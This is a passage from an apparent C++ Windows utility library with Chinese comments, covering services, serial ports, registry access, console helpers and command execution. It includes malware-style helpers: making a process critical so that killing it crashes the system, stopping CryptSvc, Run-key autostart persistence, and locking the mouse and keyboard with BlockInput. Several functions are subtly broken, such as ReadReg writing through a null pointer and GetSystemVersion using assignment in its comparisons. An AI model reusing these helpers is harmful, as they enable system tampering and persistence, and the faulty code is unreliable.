typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
BOOL CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
{
	Debug(); //获得debug权限

	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess"); //加载ntdll
	if (!NtSetInformationProcess)																														   //加载失败，退出
		return 0;
	if (NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG)) < 0) //设置进程
		return 0;																																   //设置失败，退出
	else
		return 1;
}

/**************************************************
 *  @brief          停止服务
 *  @param          服务名
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage 	CloseService("CryptSvc");
 * 	@return  	    1成功，0失败
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/7
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL CloseService(const char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //打开服务管理器
	if (hSC == NULL)
	{
		CloseServiceHandle(hSC);
		return 0;
	}

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //打开服务
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		CloseServiceHandle(hSvc);
		return false; //打开服务管理器失败，关闭HANDLE退出
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //获得服务状态
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //查询服务状态失败，关闭HANDLE退出
	}
	if (status.dwCurrentState == SERVICE_RUNNING) //如果正在运行，停止服务
	{
		if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //停止服务失败，关闭HANDLE退出
		}
		while (QueryServiceStatus(hSvc, &status) == TRUE) //等待服务停止
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_STOPPED) //服务已经停止
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //服务已停止，关闭HANDLE退出
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //服务已停止，关闭HANDLE退出
}

/**************************************************
 *  @brief          启动服务
 *  @param          service:服务名
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage 	StartService("CryptSvc");
 * 	@return  	    1成功，0失败
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL _StartService(const char *service)
{
	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //打开服务管理器
	if (hSC == NULL)
	{
		CloseServiceHandle(hSC);
		return false;
	}

	SC_HANDLE hSvc = OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //打开服务
	if (hSvc == NULL)
	{
		CloseServiceHandle(hSC);
		CloseServiceHandle(hSvc);
		return false; //打开服务管理器失败，关闭HANDLE退出
	}
	SERVICE_STATUS status;
	if (QueryServiceStatus(hSvc, &status) == FALSE) //获得服务状态
	{
		CloseServiceHandle(hSvc);
		CloseServiceHandle(hSC);
		return false; //查询服务状态失败，关闭HANDLE退出
	}
	if (status.dwCurrentState != SERVICE_RUNNING) //如果未运行，启动服务
	{
		if (StartService(hSvc, 0, NULL) == FALSE)
		{
			CloseServiceHandle(hSvc);
			CloseServiceHandle(hSC);
			return false; //启动服务失败，关闭HANDLE退出
		}

		while (QueryServiceStatus(hSvc, &status) == TRUE) // 等待服务启动
		{
			Sleep(status.dwWaitHint);
			if (status.dwCurrentState == SERVICE_RUNNING) //服务已经运行
			{
				CloseServiceHandle(hSvc);
				CloseServiceHandle(hSC);
				return true; //服务已启动，关闭HANDLE退出
			}
		}
	}

	CloseServiceHandle(hSvc);
	CloseServiceHandle(hSC);
	return true; //服务已启动，关闭HANDLE退出
}

/**************************************************
 *  @brief          列出所有服务
 *  @param          service:服务名
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage 	ListService();
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/9/8
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void ListService()
{
	SC_HANDLE SCMan = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (SCMan == NULL)
	{
		CloseServiceHandle(SCMan);
		return;
	}

	LPENUM_SERVICE_STATUS service_status;
	DWORD cbBytesNeeded, ServicesReturned, ResumeHandle;

	service_status = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, 65536);

	BOOL ESS = EnumServicesStatus(SCMan, //句柄
								  SERVICE_DRIVER |
									  SERVICE_FILE_SYSTEM_DRIVER |
									  SERVICE_KERNEL_DRIVER |
									  SERVICE_WIN32 |
									  SERVICE_WIN32_OWN_PROCESS |
									  SERVICE_WIN32_SHARE_PROCESS,		 //服务类型
								  SERVICE_STATE_ALL,					 //服务的状态
								  (LPENUM_SERVICE_STATUS)service_status, //输出参数，系统服务的结构
								  65536,								 //结构的大小
								  &cbBytesNeeded,						 //输出参数，接收返回所需的服务
								  &ServicesReturned,					 //输出参数，接收返回服务的数量
								  &ResumeHandle);						 //输入输出参数，第一次调用必须为0，返回为0代表成功
	for (int i = 0; i < ServicesReturned; i++)
	{
		printf("服务显示名:%s\n", service_status[i].lpDisplayName);
		printf("\t服务名:%s\n", service_status[i].lpServiceName);

		printf("\t类型:");
		switch (service_status[i].ServiceStatus.dwServiceType)
		{ // 服务状态
		case SERVICE_FILE_SYSTEM_DRIVER:
			printf("文件系统驱动程序\n");
			break;
		case SERVICE_KERNEL_DRIVER:
			printf("设备驱动程序\n");
			break;
		case SERVICE_WIN32_OWN_PROCESS:
			printf("在其自己的进程中运行\n");
			break;
		case SERVICE_WIN32_SHARE_PROCESS:
			printf("与其他服务共享一个进程\n");
			break;
		case 0x00000050:
			printf("在其自己的进程中运行\n");
			break;
		case 0x00000060:
			printf("在登录用户帐户下运行的一个或多个其他服务共享一个进程\n");
			break;
		case SERVICE_INTERACTIVE_PROCESS:
			printf("可以与桌面交互\n");
			break;
		default:
			printf("未知\n");
			break;
		}

		printf("\t状态:");
		switch (service_status[i].ServiceStatus.dwCurrentState)
		{ // 服务状态
		case SERVICE_CONTINUE_PENDING:
			printf("即将继续\n");
			break;
		case SERVICE_PAUSE_PENDING:
			printf("即将暂停\n");
			break;
		case SERVICE_PAUSED:
			printf("已暂停\n");
			break;
		case SERVICE_RUNNING:
			printf("正在运行\n");
			break;
		case SERVICE_START_PENDING:
			printf("正在启动\n");
			break;
		case SERVICE_STOP_PENDING:
			printf("正在停止\n");
			break;
		case SERVICE_STOPPED:
			printf("已停止\n");
			break;
		default:
			printf("未知\n");
			break;
		}
		LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;												//服务详细信息结构
		SC_HANDLE service_curren = NULL;															//当前的服务句柄
		service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG); //打开当前服务
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, 8192);							//分配内存， 最大为8kb

		if (!QueryServiceConfig(service_curren, lpServiceConfig, 8192, &ResumeHandle))
		{
			CloseServiceHandle(service_curren);
			CloseServiceHandle(SCMan);
			return;
		}
		printf("\t启动命令:%s\n", lpServiceConfig->lpBinaryPathName);
		CloseServiceHandle(service_curren);
	}
	CloseServiceHandle(SCMan);
}

//串口操作开始

/**************************************************
 *  @brief         串口操作
 *  @Sample usage
	SerialPort w;//使用，不是必须用w
	w.open("\\\\.\\COM7");//打开COM7 不是必须用COM7
	w.close()//关闭
	w.send("at\r");//发送
	w.receive()；//接收

**************************************************/

/**************************************************
 *  @brief          打开串口
 *  @param
	portname(串口名): 在Windows下是"COM1""COM2"等，在Linux下是"/dev/ttyS1"等
	baudrate(波特率): 9600、19200、38400、43000、56000、57600、115200
	parity(校验位): 0为无校验，1为奇校验，2为偶校验，3为标记校验
	databit(数据位): 4-8，通常为8位
	stopbit(停止位): 1为1位停止位，2为2位停止位,3为1.5位停止位
	synchronizable(同步、异步): 0为异步，1为同步
 *  @note           非独立模块
 *  @Sample usage 	open(端口号);
 * 	@return         成功返回true，失败返回false
 * 	@author         xbebhxx3
 * 	@version        2.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
**************************************************/
BOOL SerialPort::open(const char *portname, int baudrate = 115200, char parity = 0, char databit = 8, char stopbit = 1, char synchronizeflag = 1)
{
	this->synchronizeflag = synchronizeflag;
	HANDLE hCom = NULL;
	if (this->synchronizeflag)
		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); //同步方式
	else
		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL); //异步方式
	if (hCom == (HANDLE)-1)
		return false;
	if (!SetupComm(hCom, 1024, 1024))
		return false; //配置缓冲区大小
	// 配置参数
	DCB p;
	memset(&p, 0, sizeof(p));
	p.DCBlength = sizeof(p);
	p.BaudRate = baudrate; // 波特率
	p.ByteSize = databit;  // 数据位
	switch (parity)		   //校验位
	{
	case 0:
		p.Parity = NOPARITY; //无校验
		break;
	case 1:
		p.Parity = ODDPARITY; //奇校验
		break;
	case 2:
		p.Parity = EVENPARITY; //偶校验
		break;
	case 3:
		p.Parity = MARKPARITY; //标记校验
		break;
	}
	switch (stopbit) //停止位
	{
	case 1:
		p.StopBits = ONESTOPBIT; // 1位停止位
		break;
	case 2:
		p.StopBits = TWOSTOPBITS; // 2位停止位
		break;
	case 3:
		p.StopBits = ONE5STOPBITS; // 1.5位停止位
		break;
	}
	if (!SetCommState(hCom, &p))
		return false;							// 设置参数失败
	COMMTIMEOUTS TimeOuts;						//超时处理,单位:毫秒，总超时＝时间系数×读或写的字符数＋时间常量
	TimeOuts.ReadIntervalTimeout = 1000;		//读间隔超时
	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//读时间系数
	TimeOuts.ReadTotalTimeoutConstant = 5000;	//读时间常量
	TimeOuts.WriteTotalTimeoutMultiplier = 500; // 写时间系数
	TimeOuts.WriteTotalTimeoutConstant = 2000;	//写时间常量
	SetCommTimeouts(hCom, &TimeOuts);
	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR); //清空串口缓冲区
	memcpy(pHandle, &hCom, sizeof(hCom));			// 保存句柄
	return true;
}

/**************************************************
 *  @brief          关闭串口
 *  @param          NULL
 *  @note           非独立模块
 *  @Sample usage   open(端口号);
 * 	@return         成功返回true，失败返回false
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
void SerialPort::close()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	CloseHandle(hCom);
}

/**************************************************
 *  @brief          发送数据
 *  @param          dat:发送的数据
 *  @note           非独立模块
 *  @Sample usage   send(发送的数据);
 * 	@return      	成功返回发送数据长度，失败返回0
 * 	@author         xbebhxx3
 * 	@version        1.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
int SerialPort::send(const string dat)
{
	HANDLE hCom = *(HANDLE *)pHandle;
	if (this->synchronizeflag)
	{																							   // 同步方式
		DWORD dwBytesWrite = dat.length();														   //成功写入的数据字节数
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, NULL); //同步发送
		if (!bWriteStat)
			return 0;
		return dwBytesWrite;
	}
	else
	{																									 //异步方式
		DWORD dwBytesWrite = dat.length();																 //成功写入的数据字节数
		DWORD dwErrorFlags;																				 //错误标志
		COMSTAT comStat;																				 //通讯状态
		OVERLAPPED m_osWrite;																			 //异步输入输出结构体
		memset(&m_osWrite, 0, sizeof(m_osWrite));														 //创建一个用于OVERLAPPED的事件处理，不会真正用到，但系统要求这么做
		ClearCommError(hCom, &dwErrorFlags, &comStat);													 //清除通讯错误，获得设备当前状态
		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, &m_osWrite); //异步发送
		if (!bWriteStat)
			if (GetLastError() == ERROR_IO_PENDING)
				WaitForSingleObject(m_osWrite.hEvent, 500); //如果串口正在写入等待写入事件0.5秒钟
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误
				CloseHandle(m_osWrite.hEvent);				   //关闭并释放hEvent内存
				return 0;
			}
		return dwBytesWrite;
	}
}

/**************************************************
 *  @brief          接收数据
 *  @param          NULL
 *  @note           非独立模块
 *  @Sample usage   receive();
 * 	@return         数据
 * 	@author         xbebhxx3
 * 	@version        3.0
 * 	@date           2022/8/13
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
string SerialPort::receive()
{
	HANDLE hCom = *(HANDLE *)pHandle;
	string rec_str = "";
	char buf[1024];
	if (this->synchronizeflag)
	{																 //同步方式
		DWORD wCount = 1024;										 //成功读取的数据字节数
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, NULL); //同步接收
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
	else
	{												   //异步方式
		DWORD wCount = 1024;						   //成功读取的数据字节数
		DWORD dwErrorFlags;							   //错误标志
		COMSTAT comStat;							   //通讯状态
		OVERLAPPED m_osRead;						   //异步输入输出结构体
		memset(&m_osRead, 0, sizeof(m_osRead));		   //创建一个用于OVERLAPPED的事件处理，不会真正用到，但系统要求这么做
		ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误，获得设备当前状态
		if (!comStat.cbInQue)
			return "";													  //如果输入缓冲区字节数为0，则返回false
		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, &m_osRead); //异步接收
		if (!bReadStat)
		{
			if (GetLastError() == ERROR_IO_PENDING)
				GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE); //如果串口正在读取中，GetOverlappedResult函数的最后一个参数设为TRUE，函数会一直等待，直到读操作完成或由于错误而返回
			else
			{
				ClearCommError(hCom, &dwErrorFlags, &comStat); //清除通讯错误
				CloseHandle(m_osRead.hEvent);				   //关闭并释放hEvent的内存
				return "";
			}
		}
		for (int i = 0; i < strlen(buf); i++)
		{
			if (buf[i] != -52)
				rec_str += buf[i];
			else
				break;
		}
		return rec_str;
	}
}

//注册表操作开始

/**************************************************
 *  @brief          读注册表
 *  @param          path:路径 key:key
 *  @note           头文件: #include <windows.h>
 *  @Sample usage   ReadReg("Software\\xbebhxx3", "aaa");
 *  @return         注册表值，0为失败
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *ReadReg(const char *path, const char *key)
{
	char *value = {0};
	HKEY hKey;
	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //打开注册表
	if (ret != ERROR_SUCCESS)
		return 0;
	//读取KEY
	DWORD dwType = REG_SZ; //数据类型
	DWORD cbData = 256;
	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData); //读取注册表
	if (ret == ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //关闭注册表
		return value;
	}
}
/**************************************************
 *  @brief          写注册表
 *  @param          path:路径 key:key value:值
 *  @note           头文件: #include <windows.h>
 *  @Sample usage   WriteReg("Software\\xbebhxx3", "aaa", "bbb");
 *  @return         1成功，0失败
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL WriteReg(const char *path, const char *key, const char *value)
{
	HKEY hKey;
	DWORD dwDisp;
	DWORD dwType = REG_SZ;																										//数据类型
	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); //打开注册表
	if (ret != ERROR_SUCCESS)
	{
		RegCloseKey(hKey); //关闭注册表
		return 0;
	}
	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE *)value, strlen(value)); //写入注册表
	RegCloseKey(hKey);														  //关闭注册表
	return 1;
}

/**************************************************
 *  @brief          删除注册表项
 *  @param          path:路径
 *  @note           头文件: #include <windows.h>
 *  @Sample usage   DelReg("Software\\xbebhxx3");
 *  @return         1成功，0失败
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL DelReg(const char *path)
{
	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //删除注册表
	if (ret == ERROR_SUCCESS)
		return 1;
	else
		return 0;
}

/**************************************************
 *  @brief          删除注册表值
 *  @param          path:路径, value:值
 *  @note           头文件: #include <windows.h>
 *  @Sample usage   DelRegValue("Software\\xbebhxx3","aaa");
 *  @return         1成功，0失败
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL DelRegValue(const char *path, const char *Value)
{
	HKEY hKey;
	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //打开注册表
	if (ret == ERROR_SUCCESS)
	{
		RegDeleteValue(hKey, Value); //删除注册表
		RegCloseKey(hKey);			 //关闭注册表
		return 1;
	}
	RegCloseKey(hKey); //关闭注册表
	return 0;
}

/**************************************************
 *  @brief          设置开机自启
 *  @param          name:程序名，fSuspend:1开启，0关闭
 *  @note           头文件: #include <windows.h>
 *  @calls          WriteReg,DelRegValue
 *  @Sample usage   AutoRun(程序名，1);
 *  @return         1成功，0失败
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/4
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL AutoRun(const char *name, BOOL fSuspend)
{
	if (fSuspend == 1)
	{
		char szFilePath[MAX_PATH + 1] = {0};
		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
		return WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, szFilePath); //写入注册表值
	}
	else
	{
		return DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name); //删除注册表值
	}
}

//编/解码操作开始

/**************************************************
 *  @brief          Url编码
 *  @param          URL:需要编码的东西
 *  @Sample usage   CodeUrl(需要编码的东西);
 *  @return     	编码后的
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string CodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (('0' <= c && c <= '9') || ('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') || c == '/' || c == '.')
			result += c;
		else
		{
			int j = (short int)c;
			if (j < 0)
				j += 256;
			int i1, i0;
			i1 = j / 16;
			i0 = j - i1 * 16;
			result += '%';
			if (0 <= i1 && i1 <= 9)
				result += char(short('0') + i1);
			else if (10 <= i1 && i1 <= 15)
				result += char(short('A') + i1 - 10);
			if (0 <= i0 && i0 <= 9)
				result += char(short('0') + i0);
			else if (10 <= i0 && i0 <= 15)
				result += char(short('A') + i0 - 10);
		}
	}
	return result;
}

/**************************************************
 *  @brief          Url解码
 *  @param          URL:需要解码的东西
 *  @Sample usage   decodeUrl(需要解码的东西);
 *  @return     	解码后的
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2021/10/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
string DecodeUrl(const string &URL)
{
	string result = "";
	for (unsigned int i = 0; i < URL.size(); i++)
	{
		char c = URL[i];
		if (c != '%')
			result += c;
		else
		{
			char c1 = URL[++i];
			char c0 = URL[++i];
			int num = 0;
			if ('0' <= c1 && c1 <= '9')
				num += short(c1 - '0') * 16;
			else if ('a' <= c1 && c1 <= 'f')
				num += (short(c1 - 'a') + 10) * 16;
			else if ('A' <= c1 && c1 <= 'F')
				num += (short(c1 - 'A') + 10) * 16;
			if ('0' <= c0 && c0 <= '9')
				num += short(c0 - '0');
			else if ('a' <= c0 && c0 <= 'f')
				num += (short(c0 - 'a') + 10);
			else if ('A' <= c0 && c0 <= 'F')
				num += (short(c0 - 'A') + 10);
			result += char(num);
		}
	}
	return result;
}

/**************************************************
 *  @brief          x3code加密
 *  @param          c:需要加密的东西
 *  @Sample usage   x3code("xbebhxx3");
 *  @return     	加密后的
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/30
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *x3code(char *c)
{
	for (int i = 0; i <= sizeof(c); i++)
	{
		if ((c[i] >= 'A' && c[i] <= 'V') || (c[i] >= 'a' && c[i] <= 'v'))
		{
			c[i] = (c[i] ^ 8) + 4;
		}
		else if ((c[i] >= 'W' && c[i] <= 'Z') || (c[i] >= 'w' && c[i] <= 'z'))
		{
			c[i] = (c[i] ^ 6) - 22;
		}
		else if ((c[i] >= '1' && c[i] <= '4'))
		{
			c[i] = (c[i] ^ 4) - 8;
		}
		else if ((c[i] >= '5' && c[i] <= '9'))
		{
			c[i] = (c[i] ^ 7) + 22;
		}
		else if ((c[i] >= ' ' && c[i] <= '('))
		{
			c[i] = (c[i] ^ 2) - 21;
		}
		else if ((c[i] >= ')' && c[i] <= '/'))
		{
			c[i] = (c[i] ^ 3) + 12;
		}
		else
			;
	}
	return c;
}

//改变颜色开始

/**************************************************
 *  @brief          RGB初始化
 *  @Sample usage   rgb_init()
 *  @note	    	头文件: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void rgb_init()
{												   // 初始化
	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);   //输入句柄
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE); //输出句柄
	DWORD dwInMode, dwOutMode;
	GetConsoleMode(hIn, &dwInMode);	  //获取控制台输入模式
	GetConsoleMode(hOut, &dwOutMode); //获取控制台输出模式
	dwInMode |= 0x0200;				  //更改
	dwOutMode |= 0x0004;
	SetConsoleMode(hIn, dwInMode);	 //设置控制台输入模式
	SetConsoleMode(hOut, dwOutMode); //设置控制台输出模式
	CloseHandle(hIn);
	CloseHandle(hOut);
}

/**************************************************
 *  @brief          RGB设置
 *  @param	    	wr:字体红 wg:字体绿 wb:字体蓝 br:背景红 bg:背景绿 bb:背景蓝 (0-255)
 *  @Sample usage   rgb_set(255,255,255,0,0,0);
 *  @note	    	在这之前先运行 rgb_init();
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void rgb_set(int wr, int wg, int wb, int br, int bg, int bb)
{
	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38表示前景，\033[48表示背景，三个%d表示混合的数
}

//其他

/**************************************************
 *  @brief          锁定鼠标键盘 (需要管理员权限)
 *  @param          lockb:1锁定,0或为空解除
 *  @return         1成功，0失败
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage   lockkm(1); 锁定 lockkm(0); lockkm(0);解锁
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/3/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
BOOL lockkm(BOOL lockb = false)
{
	HINSTANCE hIn = NULL;
	hIn = LoadLibrary("user32.dll");
	if (hIn)
	{
		BOOL(_stdcall * BlockInput)
		(BOOL bFlag);
		BlockInput = (BOOL(_stdcall *)(BOOL bFlag))GetProcAddress(hIn, "BlockInput");
		if (BlockInput)
			return BlockInput(lockb);
		else
			return 0;
	}
	else
		return 0;
}

/**************************************************
 *  @brief          获得鼠标位置
 *  @param          x:x坐标，y:y坐标
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage   mouxy(鼠标x坐标，y坐标);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/5/2
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void mouxy(int &x, int &y)
{
	POINT p;
	GetCursorPos(&p); //获取鼠标坐标
	x = p.x;
	y = p.y;
}

/**************************************************
 *  @brief          清屏
 *  @param          NULL
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage   cls();
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void cls()
{
	HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);		 //获取标准输出设备的句柄
	CONSOLE_SCREEN_BUFFER_INFO csbi;					 //定义表示屏幕缓冲区属性的变量
	GetConsoleScreenBufferInfo(hdout, &csbi);			 //获取标准输出设备的屏幕缓冲区属性
	DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //定义双字节变量
	COORD pos = {0, 0};									 //表示坐标的变量（初始化为左上角(0, 0)点）

	//把窗口缓冲区全部填充为空格并填充为默认颜色（清屏）
	FillConsoleOutputCharacter(hdout, ' ', size, pos, &num);
	FillConsoleOutputAttribute(hdout, csbi.wAttributes, size, pos, &num);
	SetConsoleCursorPosition(hdout, pos); //光标定位到窗口左上角
	CloseHandle(hdout);
}

/**************************************************
 *  @brief          str删除空格
 *  @param          s:要删除空格的string变量
 *  @note           头文件: #include <Windows.h>
 *  @Sample usage   delspace(要删除空格的string变量);
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/14
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
void delspace(string &s)
{
	int index = 0;
	if (!s.empty())
		while ((index = s.find(' ', index)) != string::npos)
			s.erase(index, 1);
}

/**************************************************
 *  @brief          获得当前ip
 *  @note           头文件: #include <WinSock2.h>	编译时加-lgdi32 -lwsock32
 *  @Sample usage   ip();
 *  @return         本机主网卡ip
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2021/9/23
 *  @copyright      Copyright (c) 2021 by xbebhxx3, All Rights Reserved
 **************************************************/
char *getIp()
{
	WSADATA wsaData;
	int ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
	char hostname[256];
	ret = gethostname(hostname, sizeof(hostname));
	HOSTENT *host = gethostbyname(hostname);
	return inet_ntoa(*(in_addr *)*host->h_addr_list);
}

/**************************************************
 *  @brief          获得当前用户名
 *  @Sample usage   GetUser();
 *  @return      	当前用户名 0失败
 *  @note		    头文件: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        1.0
 *  @date           2022/2/28
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *GetUser()
{
	static CHAR GetUser_cUserNameBuffer[256];
	DWORD dwUserNameSize = 256;

	if (GetUserName(GetUser_cUserNameBuffer, &dwUserNameSize))
	{
		return GetUser_cUserNameBuffer;
	}
	else
		return 0;
}

/**************************************************
 *  @brief          获得系统版本
 *  @Sample usage   GetSystemVersion();
 *  @return         系统版本
 *  @note		    头文件: #include<Windows.h>
 *  @author         xbebhxx3
 *  @version        4.0
 *  @date           2021/2/24
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
const char *GetSystemVersion()
{
	OSVERSIONINFO osv = {0};
	osv.dwOSVersionInfoSize = sizeof(osv);
	if (!GetVersionEx(&osv))
		return 0;
	else if (osv.dwMajorVersion = 10 && osv.dwMinorVersion == 0)
		return "Windows 10"; // or windows server 2016
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 3)
		return "Windows 8.1"; // or windows server 2012 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 2)
		return "Windows 8"; // or windows server 2012
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 1)
		return "Windows 7"; // or windows server 2008 R2
	else if (osv.dwMajorVersion = 6 && osv.dwMinorVersion == 0)
		return "Windows Vista"; // or windows server 2008
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 2)
		return "Windows server 2003"; // or windows server 2003 R2
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows xp";
	else if (osv.dwMajorVersion = 5 && osv.dwMinorVersion == 1)
		return "Windows 2000";
	else
		return "err";
}

/**************************************************
 *  @brief          执行cmd命令并获得返回值
 *  @Sample usage   getCmdResult("echo 1");
 *  @return         返回值
 *  @author         xbebhxx3
 *  @version        2.0
 *  @date           2022/3/5
 *  @copyright      Copyright (c) 2022 by xbebhxx3, All Rights Reserved
 **************************************************/
char *getCmdResult(const char *Cmd)
{
	static char getCmdResult_Result[102400] = {0};
	char buf1[1024000] = {0};
	FILE *pf = popen(Cmd, "r");
